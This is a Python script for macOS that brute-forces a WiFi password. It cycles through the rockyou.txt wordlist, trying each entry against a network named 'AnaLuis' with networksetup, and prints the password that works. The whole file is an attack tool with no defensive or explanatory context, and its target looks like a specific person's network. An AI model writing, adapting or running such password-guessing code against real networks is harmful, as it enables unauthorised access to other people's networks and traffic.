import subprocess
import time

# Specify the target WiFi network SSID
target_ssid = 'AnaLuis'

# Try connecting to the WiFi network using a password from the wordlist
with open('rockyou.txt', 'r') as f:
    for line in f:
        password = line.strip()
        
        # Disconnect from any current network
        subprocess.call(['networksetup', '-setairportpower', 'en0', 'off'])
        time.sleep(1)
        subprocess.call(['networksetup', '-setairportpower', 'en0', 'on'])
        time.sleep(1)
        
        try:
            # Attempt to connect to the target network with the current password
            subprocess.check_output(['networksetup', '-setairportnetwork', 'en0', target_ssid, password])
            
            # If no error, connection succeeded
            print(f"Password found: {password}")
            break
        except subprocess.CalledProcessError:
            # If an error occurred, connection failed
            print(f"Password failed: {password}")